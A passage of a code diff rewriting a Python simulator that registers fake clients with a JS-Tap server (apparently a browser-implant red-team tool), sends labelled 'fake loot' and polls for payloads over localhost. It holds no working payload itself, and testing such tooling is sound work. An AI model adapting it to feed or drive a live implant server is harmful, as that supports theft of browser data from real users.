+    idx = 1
+    for profile in CLIENT_PROFILES:
+        for _ in range(profile["count"]):
+            clients.append(SimClient(
+                index=idx,
+                label=profile["label"],
+                tag=profile["tag"],
+                user_agent=profile["user_agent"],
+                server=server,
+            ))
+            idx += 1
+    return clients
 
 
 async def main():
+    parser = argparse.ArgumentParser(description="JS-Tap Client Simulator")
+    parser.add_argument("--server", default="https://127.0.0.1:8444",
+                        help="JS-Tap server URL (default: https://127.0.0.1:8444)")
+    parser.add_argument("--loot-rounds", type=int, default=2,
+                        help="Rounds of fake loot per client (default: 2, 0 = continuous)")
+    parser.add_argument("--poll-interval", type=float, default=3,
+                        help="Seconds between payload polls (default: 3)")
+    parser.add_argument("--no-loot", action="store_true",
+                        help="Register and poll only, skip sending fake loot")
+    args = parser.parse_args()
+
+    clients = build_clients(args.server)
+    grid = StatusGrid(clients)
+
+    print(f"\n  Registering {len(clients)} clients with {args.server} ...\n")
+
+    # Register all clients concurrently
     async with aiohttp.ClientSession() as session:
-       clients = [Client(client_id=i) for i in range(numClients)]
-       await asyncio.gather(*(client.initialize(session) for client in clients))
-       tasks = [client.run(session) for client in clients]
-       await asyncio.gather(*tasks)
+        await asyncio.gather(*(c.register(session) for c in clients))
+
+        registered = sum(1 for c in clients if c.uuid)
+        if registered == 0:
+            print("  [!] No clients registered. Is the server running?")
+            return
+
+        print(f"  {registered}/{len(clients)} clients registered.\n")
+
+        grid.render()
+
+        # Send loot rounds
+        if not args.no_loot:
+            rounds = args.loot_rounds
+            if rounds == 0:
+                # Continuous mode: send loot in background alongside polling
+                pass
+            else:
+                for r in range(rounds):
+                    await asyncio.gather(*(c.send_loot_round(session) for c in clients if c.uuid))
+                    # Small delay between rounds
+                    await asyncio.sleep(0.5)
+                print(f"  Sent {rounds} loot round(s). Entering poll loop (Ctrl+C to exit)...\n")
+        else:
+            print("  Skipping loot (--no-loot). Entering poll loop (Ctrl+C to exit)...\n")
+
+        # Poll loop
+        continuous_loot = not args.no_loot and args.loot_rounds == 0
+        loot_round_counter = 0
+
+        try:
+            while True:
+                # Poll all clients for tasks concurrently
+                await asyncio.gather(*(c.poll_tasks(session) for c in clients if c.uuid))
+                grid.render(last_poll_time=time.time())
+
+                # If continuous loot mode, send a round periodically
+                if continuous_loot:
+                    loot_round_counter += 1
+                    await asyncio.gather(*(c.send_loot_round(session) for c in clients if c.uuid))
+
+                await asyncio.sleep(args.poll_interval)
+        except KeyboardInterrupt:
+            # Move below the grid before exiting
+            print(f"\n  Shutting down. {sum(len(c.payloads_received) for c in clients)} total payloads received across {registered} clients.")
+
 
 if __name__ == "__main__":
-	asyncio.run(main())
-
-	# try:
-	# 	while True:
-	# 		time.sleep(5)
-	# except KeyboardInterrupt:
-	# 	for clientThread in clientThreads:
-	# 		clientThread.stop()
-
-	# 	for clientThread in clientThreads:
-	# 		clientThread.join()
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        pass
